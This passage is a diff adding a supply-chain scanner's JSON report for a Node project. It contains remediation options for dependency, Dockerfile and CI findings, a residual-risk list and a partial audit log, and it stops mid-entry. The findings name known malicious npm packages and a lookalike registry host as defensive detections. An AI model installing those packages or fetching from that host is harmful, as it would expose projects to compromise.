+            "description": "Accept the risk (requires a written justification and an expiry/review date)",
+            "changes": [],
+            "risk_reduction": {
+              "findings_resolved": [],
+              "score_removed": 0,
+              "estimate": false,
+              "note": "risk accepted, recorded as residual"
+            },
+            "compatibility": {
+              "level": "none",
+              "reasons": [
+                "no change"
+              ]
+            },
+            "rollback": "the change is a single commit on branch guardian/fix-*; `git revert <commit>` or delete the branch (nothing is merged automatically)"
+          },
+          {
+            "option_id": "R11.c",
+            "action": "escalate",
+            "recommended": false,
+            "description": "Request security review; keep the component blocked by policy meanwhile",
+            "changes": [],
+            "risk_reduction": {
+              "findings_resolved": [],
+              "score_removed": 0,
+              "estimate": true,
+              "note": "risk unchanged until review decision"
+            },
+            "compatibility": {
+              "level": "none",
+              "reasons": [
+                "no code change"
+              ]
+            },
+            "rollback": "the change is a single commit on branch guardian/fix-*; `git revert <commit>` or delete the branch (nothing is merged automatically)"
+          }
+        ]
+      },
+      {
+        "item_id": "R12",
+        "title": "Dockerfile: RUN pipes a downloaded script into a shell",
+        "priority": "P2-high",
+        "score": 75,
+        "findings": [
+          "GRD-09f992c3b6"
+        ],
+        "categories": [
+          "untrusted-image"
+        ],
+        "component": null,
+        "dependency_paths": [],
+        "reachability": {
+          "level": "n/a",
+          "detail": "finding is about a file, not a package",
+          "files": []
+        },
+        "exposure": {
+          "context": "runtime-image",
+          "production": true,
+          "detail": "defined in Dockerfile"
+        },
+        "status": "pending-approval",
+        "approval": null,
+        "options": [
+          {
+            "option_id": "R12.a",
+            "action": "escalate",
+            "recommended": true,
+            "description": "Request security review; keep the component blocked by policy meanwhile",
+            "changes": [],
+            "risk_reduction": {
+              "findings_resolved": [],
+              "score_removed": 0,
+              "estimate": true,
+              "note": "risk unchanged until review decision"
+            },
+            "compatibility": {
+              "level": "none",
+              "reasons": [
+                "no code change"
+              ]
+            },
+            "rollback": "the change is a single commit on branch guardian/fix-*; `git revert <commit>` or delete the branch (nothing is merged automatically)"
+          },
+          {
+            "option_id": "R12.b",
+            "action": "accept",
+            "description": "Accept the risk (requires a written justification and an expiry/review date)",
+            "changes": [],
+            "risk_reduction": {
+              "findings_resolved": [],
+              "score_removed": 0,
+              "estimate": false,
+              "note": "risk accepted, recorded as residual"
+            },
+            "compatibility": {
+              "level": "none",
+              "reasons": [
+                "no change"
+              ]
+            },
+            "rollback": "the change is a single commit on branch guardian/fix-*; `git revert <commit>` or delete the branch (nothing is merged automatically)"
+          }
+        ]
+      },
+      {
+        "item_id": "R13",
+        "title": "quick-actions/npm-cache@main: cicd",
+        "priority": "P2-high",
+        "score": 75,
+        "findings": [
+          "GRD-04410445f6"
+        ],
+        "categories": [
+          "cicd"
+        ],
+        "component": {
+          "id": "pkg:githubactions/quick-actions/npm-cache@main",
+          "name": "quick-actions/npm-cache",
+          "version": "main",
+          "ecosystem": "github-actions",
+          "direct": true,
+          "scope": "ci"
+        },
+        "dependency_paths": [],
+        "reachability": {
+          "level": "n/a",
+          "detail": "not a code library (image / CI component)",
+          "files": []
+        },
+        "exposure": {
+          "context": "ci-pipeline",
+          "production": false,
+          "detail": "runs in CI with access to repository tokens/secrets"
+        },
+        "status": "pending-approval",
+        "approval": null,
+        "options": [
+          {
+            "option_id": "R13.a",
+            "action": "escalate",
+            "recommended": true,
+            "description": "Request security review; keep the component blocked by policy meanwhile",
+            "changes": [],
+            "risk_reduction": {
+              "findings_resolved": [],
+              "score_removed": 0,
+              "estimate": true,
+              "note": "risk unchanged until review decision"
+            },
+            "compatibility": {
+              "level": "none",
+              "reasons": [
+                "no code change"
+              ]
+            },
+            "rollback": "the change is a single commit on branch guardian/fix-*; `git revert <commit>` or delete the branch (nothing is merged automatically)"
+          }
+        ]
+      },
+      {
+        "item_id": "R14",
+        "title": "fastbuilds/node-runtime@18: untrusted-image",
+        "priority": "P2-high",
+        "score": 75,
+        "findings": [
+          "GRD-a0dfadd0ab"
+        ],
+        "categories": [
+          "untrusted-image"
+        ],
+        "component": {
+          "id": "pkg:docker/fastbuilds/node-runtime@18",
+          "name": "fastbuilds/node-runtime",
+          "version": "18",
+          "ecosystem": "docker",
+          "direct": true,
+          "scope": "prod"
+        },
+        "dependency_paths": [],
+        "reachability": {
+          "level": "n/a",
+          "detail": "not a code library (image / CI component)",
+          "files": []
+        },
+        "exposure": {
+          "context": "runtime-image",
+          "production": true,
+          "detail": "base image of a shipped container"
+        },
+        "status": "pending-approval",
+        "approval": null,
+        "options": [
+          {
+            "option_id": "R14.a",
+            "action": "pin",
+            "recommended": true,
+            "description": "Pin 'fastbuilds/node-runtime' to an explicit version tag + sha256 digest from a trusted registry (digest lookup needs registry access; filled in by the reviewer)",
+            "changes": [],
+            "risk_reduction": {
+              "findings_resolved": [
+                "GRD-a0dfadd0ab"
+              ],
+              "score_removed": 75,
+              "estimate": true,
+              "note": "expected; confirmed by rescan during validation"
+            },
+            "compatibility": {
+              "level": "low",
+              "reasons": [
+                "same image if pinned to the current digest"
+              ]
+            },
+            "rollback": "the change is a single commit on branch guardian/fix-*; `git revert <commit>` or delete the branch (nothing is merged automatically)"
+          },
+          {
+            "option_id": "R14.b",
+            "action": "escalate",
+            "recommended": false,
+            "description": "Request security review; keep the component blocked by policy meanwhile",
+            "changes": [],
+            "risk_reduction": {
+              "findings_resolved": [],
+              "score_removed": 0,
+              "estimate": true,
+              "note": "risk unchanged until review decision"
+            },
+            "compatibility": {
+              "level": "none",
+              "reasons": [
+                "no code change"
+              ]
+            },
+            "rollback": "the change is a single commit on branch guardian/fix-*; `git revert <commit>` or delete the branch (nothing is merged automatically)"
+          }
+        ]
+      },
+      {
+        "item_id": "R15",
+        "title": "debug-helper-utils@1.0.2: unexpected-dependency",
+        "priority": "P2-high",
+        "score": 75,
+        "findings": [
+          "GRD-46055a5e2c"
+        ],
+        "categories": [
+          "unexpected-dependency"
+        ],
+        "component": {
+          "id": "pkg:npm/debug-helper-utils@1.0.2",
+          "name": "debug-helper-utils",
+          "version": "1.0.2",
+          "ecosystem": "npm",
+          "direct": true,
+          "scope": "prod"
+        },
+        "dependency_paths": [
+          [
+            "shop-api@1.4.0",
+            "debug-helper-utils@1.0.2"
+          ]
+        ],
+        "reachability": {
+          "level": "unknown",
+          "detail": "no import of debug-helper-utils found; may still be loaded dynamically",
+          "files": []
+        },
+        "exposure": {
+          "context": "server",
+          "production": true,
+          "detail": "runs in the server process"
+        },
+        "status": "pending-approval",
+        "approval": null,
+        "options": [
+          {
+            "option_id": "R15.a",
+            "action": "lock-regenerate",
+            "recommended": true,
+            "description": "Regenerate the lockfile from package.json using the public registry (drops injected entries and re-fetches trusted hashes)",
+            "changes": [
+              {
+                "type": "lockfile",
+                "subproject": "",
+                "op": "regenerate"
+              }
+            ],
+            "risk_reduction": {
+              "findings_resolved": [
+                "GRD-46055a5e2c"
+              ],
+              "score_removed": 75,
+              "estimate": true,
+              "note": "expected; confirmed by rescan during validation"
+            },
+            "compatibility": {
+              "level": "medium",
+              "reasons": [
+                "other transitive versions may move within their ranges"
+              ]
+            },
+            "rollback": "the change is a single commit on branch guardian/fix-*; `git revert <commit>` or delete the branch (nothing is merged automatically)"
+          },
+          {
+            "option_id": "R15.b",
+            "action": "escalate",
+            "recommended": false,
+            "description": "Request security review; keep the component blocked by policy meanwhile",
+            "changes": [],
+            "risk_reduction": {
+              "findings_resolved": [],
+              "score_removed": 0,
+              "estimate": true,
+              "note": "risk unchanged until review decision"
+            },
+            "compatibility": {
+              "level": "none",
+              "reasons": [
+                "no code change"
+              ]
+            },
+            "rollback": "the change is a single commit on branch guardian/fix-*; `git revert <commit>` or delete the branch (nothing is merged automatically)"
+          }
+        ]
+      },
+      {
+        "item_id": "R16",
+        "title": "Untrusted event data interpolated into a workflow step",
+        "priority": "P2-high",
+        "score": 75,
+        "findings": [
+          "GRD-86639082f3"
+        ],
+        "categories": [
+          "cicd"
+        ],
+        "component": null,
+        "dependency_paths": [],
+        "reachability": {
+          "level": "n/a",
+          "detail": "finding is about a file, not a package",
+          "files": []
+        },
+        "exposure": {
+          "context": "ci-pipeline",
+          "production": false,
+          "detail": "defined in .github/workflows/ci.yml"
+        },
+        "status": "pending-approval",
+        "approval": null,
+        "options": [
+          {
+            "option_id": "R16.a",
+            "action": "escalate",
+            "recommended": true,
+            "description": "Request security review; keep the component blocked by policy meanwhile",
+            "changes": [],
+            "risk_reduction": {
+              "findings_resolved": [],
+              "score_removed": 0,
+              "estimate": true,
+              "note": "risk unchanged until review decision"
+            },
+            "compatibility": {
+              "level": "none",
+              "reasons": [
+                "no code change"
+              ]
+            },
+            "rollback": "the change is a single commit on branch guardian/fix-*; `git revert <commit>` or delete the branch (nothing is merged automatically)"
+          },
+          {
+            "option_id": "R16.b",
+            "action": "accept",
+            "description": "Accept the risk (requires a written justification and an expiry/review date)",
+            "changes": [],
+            "risk_reduction": {
+              "findings_resolved": [],
+              "score_removed": 0,
+              "estimate": false,
+              "note": "risk accepted, recorded as residual"
+            },
+            "compatibility": {
+              "level": "none",
+              "reasons": [
+                "no change"
+              ]
+            },
+            "rollback": "the change is a single commit on branch guardian/fix-*; `git revert <commit>` or delete the branch (nothing is merged automatically)"
+          }
+        ]
+      },
+      {
+        "item_id": "R17",
+        "title": "send@0.17.1: 1 known vulnerability",
+        "priority": "P2-high",
+        "score": 60,
+        "findings": [
+          "GRD-b92970fd54"
+        ],
+        "categories": [
+          "vulnerability"
+        ],
+        "component": {
+          "id": "pkg:npm/send@0.17.1",
+          "name": "send",
+          "version": "0.17.1",
+          "ecosystem": "npm",
+          "direct": false,
+          "scope": "prod"
+        },
+        "dependency_paths": [
+          [
+            "shop-api@1.4.0",
+            "express@4.17.1",
+            "send@0.17.1"
+          ],
+          [
+            "shop-api@1.4.0",
+            "express@4.17.1",
+            "serve-static@1.14.1",
+            "send@0.17.1"
+          ]
+        ],
+        "reachability": {
+          "level": "parent-imported",
+          "detail": "pulled in by 'express', which production code imports (server.js)",
+          "files": [
+            "server.js"
+          ],
+          "via": "express"
+        },
+        "exposure": {
+          "context": "server",
+          "production": true,
+          "detail": "runs in the server process"
+        },
+        "status": "pending-approval",
+        "approval": null,
+        "options": [
+          {
+            "option_id": "R17.a",
+            "action": "upgrade-parent",
+            "recommended": true,
+            "description": "Upgrade direct dependency express 4.17.1 -> 4.20.0 (minor); express@4.20.0 requires send 0.19.0, which admits a fixed version",
+            "changes": [
+              {
+                "type": "package-json",
+                "subproject": "",
+                "op": "set-dep",
+                "name": "express",
+                "value": "4.20.0",
+                "section": "dependencies"
+              }
+            ],
+            "risk_reduction": {
+              "findings_resolved": [
+                "GRD-b92970fd54"
+              ],
+              "score_removed": 60,
+              "estimate": true,
+              "note": "expected; the parent upgrade may also change other transitive packages"
+            },
+            "compatibility": {
+              "level": "low",
+              "reasons": [
+                "semver minor change",
+                "1 source file(s) import express: server.js"
+              ]
+            },
+            "rollback": "the change is a single commit on branch guardian/fix-*; `git revert <commit>` or delete the branch (nothing is merged automatically)"
+          },
+          {
+            "option_id": "R17.b",
+            "action": "override",
+            "description": "Force send@0.19.0 with npm overrides",
+            "changes": [
+              {
+                "type": "package-json",
+                "subproject": "",
+                "op": "set-override",
+                "name": "send",
+                "value": "0.19.0"
+              }
+            ],
+            "risk_reduction": {
+              "findings_resolved": [
+                "GRD-b92970fd54"
+              ],
+              "score_removed": 60,
+              "estimate": true,
+              "note": "expected; confirmed by rescan during validation"
+            },
+            "compatibility": {
+              "level": "high",
+              "reasons": [
+                "outside the declared range (express declares 0.17.1; serve-static declares 0.17.1): parent may break"
+              ]
+            },
+            "rollback": "the change is a single commit on branch guardian/fix-*; `git revert <commit>` or delete the branch (nothing is merged automatically)"
+          },
+          {
+            "option_id": "R17.c",
+            "action": "accept",
+            "description": "Accept the risk (requires a written justification and an expiry/review date)",
+            "changes": [],
+            "risk_reduction": {
+              "findings_resolved": [],
+              "score_removed": 0,
+              "estimate": false,
+              "note": "risk accepted, recorded as residual"
+            },
+            "compatibility": {
+              "level": "none",
+              "reasons": [
+                "no change"
+              ]
+            },
+            "rollback": "the change is a single commit on branch guardian/fix-*; `git revert <commit>` or delete the branch (nothing is merged automatically)"
+          },
+          {
+            "option_id": "R17.d",
+            "action": "escalate",
+            "recommended": false,
+            "description": "Request security review; keep the component blocked by policy meanwhile",
+            "changes": [],
+            "risk_reduction": {
+              "findings_resolved": [],
+              "score_removed": 0,
+              "estimate": true,
+              "note": "risk unchanged until review decision"
+            },
+            "compatibility": {
+              "level": "none",
+              "reasons": [
+                "no code change"
+              ]
+            },
+            "rollback": "the change is a single commit on branch guardian/fix-*; `git revert <commit>` or delete the branch (nothing is merged automatically)"
+          }
+        ]
+      },
+      {
+        "item_id": "R18",
+        "title": "serve-static@1.14.1: 1 known vulnerability",
+        "priority": "P2-high",
+        "score": 60,
+        "findings": [
+          "GRD-6a3bfab569"
+        ],
+        "categories": [
+          "vulnerability"
+        ],
+        "component": {
+          "id": "pkg:npm/serve-static@1.14.1",
+          "name": "serve-static",
+          "version": "1.14.1",
+          "ecosystem": "npm",
+          "direct": false,
+          "scope": "prod"
+        },
+        "dependency_paths": [
+          [
+            "shop-api@1.4.0",
+            "express@4.17.1",
+            "serve-static@1.14.1"
+          ]
+        ],
+        "reachability": {
+          "level": "parent-imported",
+          "detail": "pulled in by 'express', which production code imports (server.js)",
+          "files": [
+            "server.js"
+          ],
+          "via": "express"
+        },
+        "exposure": {
+          "context": "server",
+          "production": true,
+          "detail": "runs in the server process"
+        },
+        "status": "pending-approval",
+        "approval": null,
+        "options": [
+          {
+            "option_id": "R18.a",
+            "action": "upgrade-parent",
+            "recommended": true,
+            "description": "Upgrade direct dependency express 4.17.1 -> 4.20.0 (minor); express@4.20.0 requires serve-static 1.16.0, which admits a fixed version",
+            "changes": [
+              {
+                "type": "package-json",
+                "subproject": "",
+                "op": "set-dep",
+                "name": "express",
+                "value": "4.20.0",
+                "section": "dependencies"
+              }
+            ],
+            "risk_reduction": {
+              "findings_resolved": [
+                "GRD-6a3bfab569"
+              ],
+              "score_removed": 60,
+              "estimate": true,
+              "note": "expected; the parent upgrade may also change other transitive packages"
+            },
+            "compatibility": {
+              "level": "low",
+              "reasons": [
+                "semver minor change",
+                "1 source file(s) import express: server.js"
+              ]
+            },
+            "rollback": "the change is a single commit on branch guardian/fix-*; `git revert <commit>` or delete the branch (nothing is merged automatically)"
+          },
+          {
+            "option_id": "R18.b",
+            "action": "override",
+            "description": "Force serve-static@1.16.0 with npm overrides",
+            "changes": [
+              {
+                "type": "package-json",
+                "subproject": "",
+                "op": "set-override",
+                "name": "serve-static",
+                "value": "1.16.0"
+              }
+            ],
+            "risk_reduction": {
+              "findings_resolved": [
+                "GRD-6a3bfab569"
+              ],
+              "score_removed": 60,
+              "estimate": true,
+              "note": "expected; confirmed by rescan during validation"
+            },
+            "compatibility": {
+              "level": "high",
+              "reasons": [
+                "outside the declared range (express declares 1.14.1): parent may break"
+              ]
+            },
+            "rollback": "the change is a single commit on branch guardian/fix-*; `git revert <commit>` or delete the branch (nothing is merged automatically)"
+          },
+          {
+            "option_id": "R18.c",
+            "action": "accept",
+            "description": "Accept the risk (requires a written justification and an expiry/review date)",
+            "changes": [],
+            "risk_reduction": {
+              "findings_resolved": [],
+              "score_removed": 0,
+              "estimate": false,
+              "note": "risk accepted, recorded as residual"
+            },
+            "compatibility": {
+              "level": "none",
+              "reasons": [
+                "no change"
+              ]
+            },
+            "rollback": "the change is a single commit on branch guardian/fix-*; `git revert <commit>` or delete the branch (nothing is merged automatically)"
+          },
+          {
+            "option_id": "R18.d",
+            "action": "escalate",
+            "recommended": false,
+            "description": "Request security review; keep the component blocked by policy meanwhile",
+            "changes": [],
+            "risk_reduction": {
+              "findings_resolved": [],
+              "score_removed": 0,
+              "estimate": true,
+              "note": "risk unchanged until review decision"
+            },
+            "compatibility": {
+              "level": "none",
+              "reasons": [
+                "no code change"
+              ]
+            },
+            "rollback": "the change is a single commit on branch guardian/fix-*; `git revert <commit>` or delete the branch (nothing is merged automatically)"
+          }
+        ]
+      }
+    ],
+    "policy": "No change is applied without an explicit human approval recorded in this plan. The Guardian never pushes, merges, deploys or releases.",
+    "deferred": [],
+    "generated_at": "2026-11-24T04:54:29Z"
+  },
+  "validation": null,
+  "residual_risk": [
+    {
+      "finding": "GRD-704d795f51",
+      "title": "Integrity hash changed for unchanged version lodash@4.17.15",
+      "priority": "P1-urgent",
+      "score": 100,
+      "accepted": false
+    },
+    {
+      "finding": "GRD-613706260e",
+      "title": "Known malicious package in flatmap-stream@0.1.1: Malicious Package in flatmap-stream",
+      "priority": "P1-urgent",
+      "score": 100,
+      "accepted": false
+    },
+    {
+      "finding": "GRD-98f61e9402",
+      "title": "Known malicious package in ua-parser-js@0.7.29: Embedded malware in ua-parser-js",
+      "priority": "P1-urgent",
+      "score": 100,
+      "accepted": false
+    },
+    {
+      "finding": "GRD-0ed05bf1fe",
+      "title": "Known vulnerability in event-stream@3.3.6: Critical severity vulnerability that affects event-stream and flatmap-stream",
+      "priority": "P1-urgent",
+      "score": 100,
+      "accepted": false
+    },
+    {
+      "finding": "GRD-73005cb429",
+      "title": "Known vulnerability in flatmap-stream@0.1.1: Critical severity vulnerability that affects event-stream and flatmap-stream",
+      "priority": "P1-urgent",
+      "score": 100,
+      "accepted": false
+    },
+    {
+      "finding": "GRD-2dd08017e5",
+      "title": "Known vulnerability in minimist@1.2.5: Prototype Pollution in minimist",
+      "priority": "P1-urgent",
+      "score": 100,
+      "accepted": false
+    },
+    {
+      "finding": "GRD-21c00fec6e",
+      "title": "Lockfile hash for lodash@4.17.15 does not match the registry",
+      "priority": "P1-urgent",
+      "score": 100,
+      "accepted": false
+    },
+    {
+      "finding": "GRD-ae3966a225",
+      "title": "crossenv was taken down by npm security (malicious package)",
+      "priority": "P1-urgent",
+      "score": 100,
+      "accepted": false
+    },
+    {
+      "finding": "GRD-ca39c1eed2",
+      "title": "flatmap-stream was taken down by npm security (malicious package)",
+      "priority": "P1-urgent",
+      "score": 100,
+      "accepted": false
+    },
+    {
+      "finding": "GRD-b38171a52f",
+      "title": "Known vulnerability in body-parser@1.19.0: body-parser vulnerable to Denial of Service via trailing bytes after a compressed request body",
+      "priority": "P1-urgent",
+      "score": 95,
+      "accepted": false
+    },
+    {
+      "finding": "GRD-7c9e777fa6",
+      "title": "Known vulnerability in body-parser@1.19.0: body-parser vulnerable to denial of service when url encoding is enabled",
+      "priority": "P1-urgent",
+      "score": 95,
+      "accepted": false
+    },
+    {
+      "finding": "GRD-1c5fa4dd94",
+      "title": "Known vulnerability in path-to-regexp@0.1.7: path-to-regexp contains a ReDoS",
+      "priority": "P1-urgent",
+      "score": 95,
+      "accepted": false
+    },
+    {
+      "finding": "GRD-e29370793e",
+      "title": "Known vulnerability in path-to-regexp@0.1.7: path-to-regexp outputs backtracking regular expressions",
+      "priority": "P1-urgent",
+      "score": 95,
+      "accepted": false
+    },
+    {
+      "finding": "GRD-1f7ff0a614",
+      "title": "Known vulnerability in path-to-regexp@0.1.7: path-to-regexp vulnerable to Regular Expression Denial of Service via multiple route parameters",
+      "priority": "P1-urgent",
+      "score": 95,
+      "accepted": false
+    },
+    {
+      "finding": "GRD-c83abdd646",
+      "title": "Known vulnerability in qs@6.7.0: qs vulnerable to Prototype Pollution",
+      "priority": "P1-urgent",
+      "score": 95,
+      "accepted": false
+    },
+    {
+      "finding": "GRD-d59b7c1df8",
+      "title": "Suspicious install script in crossenv@6.1.1",
+      "priority": "P1-urgent",
+      "score": 95,
+      "accepted": false
+    },
+    {
+      "finding": "GRD-575e3b161a",
+      "title": "Known vulnerability in node-fetch@2.6.0: node-fetch forwards secure headers to untrusted sites",
+      "priority": "P1-urgent",
+      "score": 88,
+      "accepted": false
+    },
+    {
+      "finding": "GRD-ad2936893a",
+      "title": "Known vulnerability in lodash@4.17.15: lodash vulnerable to Code Injection via `_.template` imports key names",
+      "priority": "P1-urgent",
+      "score": 86,
+      "accepted": false
+    },
+    {
+      "finding": "GRD-844e5ccc16",
+      "title": "Known vulnerability in lodash@4.17.15: Prototype Pollution in lodash",
+      "priority": "P2-high",
+      "score": 79,
+      "accepted": false
+    },
+    {
+      "finding": "GRD-0bd24c48d9",
+      "title": "Known vulnerability in express@4.17.1: Express.js Open Redirect in malformed URLs",
+      "priority": "P2-high",
+      "score": 76,
+      "accepted": false
+    },
+    {
+      "finding": "GRD-09f992c3b6",
+      "title": "Dockerfile: RUN pipes a downloaded script into a shell",
+      "priority": "P2-high",
+      "score": 75,
+      "accepted": false
+    },
+    {
+      "finding": "GRD-cbacc02b07",
+      "title": "Download source for minimist@1.2.5 changed: registry.npmjs.org -> registry.npmjs-cdn.com",
+      "priority": "P2-high",
+      "score": 75,
+      "accepted": false
+    },
+    {
+      "finding": "GRD-04410445f6",
+      "title": "GitHub Action quick-actions/npm-cache: branch/unversioned ref 'main' (code changes on every run)",
+      "priority": "P2-high",
+      "score": 75,
+      "accepted": false
+    },
+    {
+      "finding": "GRD-a0dfadd0ab",
+      "title": "Image 'fastbuilds/node-runtime' comes from a non-allowlisted publisher (docker.io)",
+      "priority": "P2-high",
+      "score": 75,
+      "accepted": false
+    },
+    {
+      "finding": "GRD-46055a5e2c",
+      "title": "Lockfile root declares 'debug-helper-utils' which is not in package.json",
+      "priority": "P2-high",
+      "score": 75,
+      "accepted": false
+    },
+    {
+      "finding": "GRD-d2c4aa3ad1",
+      "title": "Possible typosquat: 'crossenv' looks like 'cross-env'",
+      "priority": "P2-high",
+      "score": 75,
+      "accepted": false
+    },
+    {
+      "finding": "GRD-86639082f3",
+      "title": "Untrusted event data interpolated into a workflow step",
+      "priority": "P2-high",
+      "score": 75,
+      "accepted": false
+    },
+    {
+      "finding": "GRD-0bb2f898bb",
+      "title": "event-stream@3.3.6 is not published on the registry (unpublished or fabricated version)",
+      "priority": "P2-high",
+      "score": 75,
+      "accepted": false
+    },
+    {
+      "finding": "GRD-dfc22d0f2f",
+      "title": "minimist@1.2.5 is fetched over plain HTTP",
+      "priority": "P2-high",
+      "score": 75,
+      "accepted": false
+    },
+    {
+      "finding": "GRD-d91accc1c1",
+      "title": "ua-parser-js@0.7.29 is not published on the registry (unpublished or fabricated version)",
+      "priority": "P2-high",
+      "score": 75,
+      "accepted": false
+    },
+    {
+      "finding": "GRD-89e19feeeb",
+      "title": "Known vulnerability in qs@6.7.0: qs : qs.stringify with arrayFormat 'comma' throws an uncaught TypeError on array elements carrying a non-callable own to",
+      "priority": "P2-high",
+      "score": 73,
+      "accepted": false
+    },
+    {
+      "finding": "GRD-26b5a19a16",
+      "title": "Known vulnerability in qs@6.7.0: qs: Denial of Service via Attacker Controlled isBuffer",
+      "priority": "P2-high",
+      "score": 73,
+      "accepted": false
+    },
+    {
+      "finding": "GRD-a128fcec7d",
+      "title": "Known vulnerability in lodash@4.17.15: Lodash has Prototype Pollution Vulnerability in `_.unset`, `_.omit`, and `_.pullAt` functions",
+      "priority": "P2-high",
+      "score": 70,
+      "accepted": false
+    },
+    {
+      "finding": "GRD-b92c8f07bb",
+      "title": "Known vulnerability in express@4.17.1: express vulnerable to XSS via response.redirect()",
+      "priority": "P2-high",
+      "score": 65,
+      "accepted": false
+    },
+    {
+      "finding": "GRD-e21d6bab29",
+      "title": "Known vulnerability in lodash@4.17.15: Command Injection in lodash",
+      "priority": "P2-high",
+      "score": 62,
+      "accepted": false
+    },
+    {
+      "finding": "GRD-b92970fd54",
+      "title": "Known vulnerability in send@0.17.1: send vulnerable to template injection that can lead to XSS",
+      "priority": "P2-high",
+      "score": 60,
+      "accepted": false
+    },
+    {
+      "finding": "GRD-6a3bfab569",
+      "title": "Known vulnerability in serve-static@1.14.1: serve-static vulnerable to template injection that can lead to XSS",
+      "priority": "P2-high",
+      "score": 60,
+      "accepted": false
+    }
+  ],
+  "accepted_risk": [],
+  "final_confidence": "n/a (not validated yet)",
+  "audit": {
+    "chain": {
+      "ok": true,
+      "entries": 22,
+      "head": "4e46ac6a4754860bf345867d63f2f67b8dbe8eb0d34d3e41c31badf43fc09d17"
+    },
+    "entries": [
+      {
+        "action": "scanned",
+        "actor": "guardian",
+        "details": {
+          "components": 157,
+          "findings": {
+            "by_category": {
+              "cicd": 4,
+              "install-script": 3,
+              "integrity": 8,
+              "malicious-package": 4,
+              "typosquat": 1,
+              "unexpected-dependency": 7,
+              "untrusted-image": 4,
+              "vulnerability": 44
+            },
+            "by_severity": {
+              "critical": 10,
+              "high": 31,
+              "info": 4,
+              "low": 12,
+              "medium": 18
+            },
+            "total": 75
+          },
+          "git": null,
+          "inputs": [
+            {
+              "git_tracked": false,
+              "path": "package.json",
+              "sha256": "74c00f2dbe29965b46ce0bfed4e864ecf1403eb957d520c3bbf13528e8a5055a"
+            },
+            {
+              "git_tracked": false,
+              "path": "package-lock.json",
+              "sha256": "f330d2b9980d968a81946a68af6628a7348e92bdb277418d099f3ef476091c05"
+            },
+            {
+              "git_tracked": false,
+              "path": "Dockerfile",
+              "sha256": "e1c58590c9f88232b1af45ddd5fd1923f0c00b6d1acf80fc2bf190dbc1546ad1"
+            },
+            {
+              "git_tracked": false,
+              "path": ".github/workflows/ci.yml",
+              "sha256": "6c1b6d9e9547bd286daa8073157dcd5b1f6067e850a55f285275bff7a17e89fc"
+            }
+          ]
+        },
+        "hash": "89ea693a962c1e25195d0e67bc0dd316f1d22a2f6af73fe04ecea94db4824a8a",
+        "host_user": "root",
+        "prev": "0000000000000000000000000000000000000000000000000000000000000000",
+        "stage": "discover+detect",
+        "ts": "2026-11-24T04:54:29.109281Z"
+      },
+      {
+        "action": "explain",
+        "actor": "guardian",
+        "details": {
+          "by": "deterministic-template",
+          "error": null,
+          "finding": "GRD-704d795f51",
+          "rejected": null
+        },
+        "hash": "1076ce985b73ff45c72ee04ae02a9e064d70c33402342e2a822bad93082d51de",
+        "host_user": "root",
+        "prev": "89ea693a962c1e25195d0e67bc0dd316f1d22a2f6af73fe04ecea94db4824a8a",
+        "stage": "analyze",
+        "ts": "2026-11-24T04:54:29.124005Z"
+      },
+      {
+        "action": "explain",
+        "actor": "guardian",
+        "details": {
+          "by": "deterministic-template",
+          "error": null,
+          "finding": "GRD-613706260e",
+          "rejected": null
+        },
+        "hash": "d6a4e6f72bf7e52a4657e33209f32900f070d63f4957475d6dbd1e75ea27060d",
+        "host_user": "root",
+        "prev": "1076ce985b73ff45c72ee04ae02a9e064d70c33402342e2a822bad93082d51de",
+        "stage": "analyze",
+        "ts": "2026-11-24T04:54:29.124199Z"
+      },
+      {
+        "action": "explain",
+        "actor": "guardian",
+        "details": {
+          "by": "deterministic-template",
+          "error": null,
+          "finding": "GRD-98f61e9402",
+          "rejected": null
+        },
+        "hash": "a3bf1a831ecba90f9fd23bfb67933044dce3b5495bc3182fc6c11e6cfb63f415",
+        "host_user": "root",
+        "prev": "d6a4e6f72bf7e52a4657e33209f32900f070d63f4957475d6dbd1e75ea27060d",
+        "stage": "analyze",
+        "ts": "2026-11-24T04:54:29.124282Z"
+      },
+      {
+        "action": "explain",
+        "actor": "guardian",
+        "details": {
+          "by": "deterministic-template",
+          "error": null,
+          "finding": "GRD-0ed05bf1fe",
+          "rejected": null
+        },
+        "hash": "1ad2242c9ebbd3dc2ca5e774726663f4507538c93446ad22af3e136e1f2350aa",
+        "host_user": "root",
+        "prev": "a3bf1a831ecba90f9fd23bfb67933044dce3b5495bc3182fc6c11e6cfb63f415",
+        "stage": "analyze",
+        "ts": "2026-11-24T04:54:29.124348Z"
+      },
+      {
+        "action": "explain",
+        "actor": "guardian",
+        "details": {
+          "by": "deterministic-template",
+          "error": null,
+          "finding": "GRD-73005cb429",
+          "rejected": null
+        },
+        "hash": "f43f2453c561d80d5d446ce52f1f437963b1b1f35f404d81ce67dd8d2b7b9a6f",
+        "host_user": "root",
+        "prev": "1ad2242c9ebbd3dc2ca5e774726663f4507538c93446ad22af3e136e1f2350aa",
+        "stage": "analyze",
+        "ts": "2026-11-24T04:54:29.124407Z"
+      },
+      {
+        "action": "explain",
+        "actor": "guardian",
+        "details": {
+          "by": "deterministic-template",
+          "error": null,
+          "finding": "GRD-2dd08017e5",
+          "rejected": null
+        },
+        "hash": "1a76525e1053b78d6255bb4c7a9bf9c3d77135656f1f04b5d6c36524cc6a2565",
+        "host_user": "root",
+        "prev": "f43f2453c561d80d5d446ce52f1f437963b1b1f35f404d81ce67dd8d2b7b9a6f",
+        "stage": "analyze",
+        "ts": "2026-11-24T04:54:29.124463Z"
+      },
+      {
+        "action": "explain",
+        "actor": "guardian",
+        "details": {
+          "by": "deterministic-template",
+          "error": null,
+          "finding": "GRD-21c00fec6e",
+          "rejected": null
+        },
+        "hash": "48b3c2b393c000837ae6bb94389fe0fdaef462b09088da452e63cef0a6e3605c",
+        "host_user": "root",
+        "prev": "1a76525e1053b78d6255bb4c7a9bf9c3d77135656f1f04b5d6c36524cc6a2565",
+        "stage": "analyze",
+        "ts": "2026-11-24T04:54:29.124518Z"
+      },
+      {
+        "action": "explain",
+        "actor": "guardian",
+        "details": {
+          "by": "deterministic-template",
+          "error": null,
+          "finding": "GRD-ae3966a225",
+          "rejected": null
+        },
+        "hash": "d6186a6caffdbb958c13a99433bfa3ced98adbf6edc25ea7d84f6a35618a3249",
+        "host_user": "root",
+        "prev": "48b3c2b393c000837ae6bb94389fe0fdaef462b09088da452e63cef0a6e3605c",
+        "stage": "analyze",
+        "ts": "2026-11-24T04:54:29.124571Z"
+      },
+      {
+        "action": "explain",
+        "actor": "guardian",
+        "details": {
+          "by": "deterministic-template",
+          "error": null,
+          "finding": "GRD-ca39c1eed2",
+          "rejected": null
+        },
+        "hash": "da498aaad7cd3e3e4873903a6c7cf0188ae59c2c92ad48d2d1a1e44429381c86",
